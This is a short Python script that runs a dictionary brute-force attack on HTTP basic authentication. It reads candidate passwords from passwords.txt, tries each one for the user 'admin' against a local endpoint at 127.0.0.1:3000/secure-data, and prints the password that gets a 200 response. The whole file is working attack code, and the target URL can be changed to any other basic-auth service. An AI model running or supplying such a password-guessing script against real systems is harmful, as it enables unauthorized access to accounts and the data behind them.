import requests

with open("passwords.txt", "r", encoding="utf-8") as file:
    for i in file:
        password = i.strip()
        try:
            response = requests.get("http://127.0.0.1:3000/secure-data", auth=("admin", password))
            if response.status_code == 200:
                print("Password found: " + password)
                break
        except UnicodeEncodeError:
            print(f"Skipping password due to encoding error: {password}")

    
